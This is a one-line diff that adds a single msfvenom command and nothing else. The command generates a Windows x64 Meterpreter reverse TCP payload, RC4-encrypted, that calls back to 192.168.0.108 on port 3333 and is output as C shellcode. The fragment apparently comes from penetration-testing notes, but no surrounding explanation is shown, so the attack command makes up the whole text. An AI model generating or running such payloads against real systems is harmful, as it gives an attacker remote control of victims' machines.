@@ -1,0 +1,1 @@
+	>msfvenom -p windows/x64/meterpreter/reverse_tcp_rc4 lhost=192.168.0.108 lport=3333 RC4PASSWORD=123qwe!@# -f c
